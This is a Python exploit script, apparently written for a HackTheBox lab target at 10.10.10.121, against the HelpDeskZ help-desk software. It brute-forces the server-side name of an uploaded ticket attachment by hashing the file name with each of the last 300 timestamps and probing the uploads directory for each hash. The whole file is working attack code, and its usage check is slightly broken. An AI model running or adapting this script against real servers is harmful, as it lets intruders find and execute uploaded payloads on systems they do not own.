import sys
import time
import hashlib
from Crypto.Hash import MD5
import requests

url = "http://10.10.10.121/support/uploads/tickets/"

if len(sys.argv) == 0:
    print("Usage: HelpDeskZ.py <filename>")
    exit()

filename = sys.argv[1]

currentTime = int(time.time())

parts = filename.split(".")
fileExtension = parts[1]

print("File name: ", filename)
print("File extension: ", fileExtension)

print(currentTime)
for time in range(300):

    plaintext = filename + str(currentTime - time)
    h = hashlib.md5(plaintext.encode('utf-8')).hexdigest()

    query = url + h + "." + fileExtension

    r = requests.head(query)

    if r.status_code == 200:
        print("Found file!")
        print(query)
        exit()
    else:
        print(".", end="", flush=True)

print()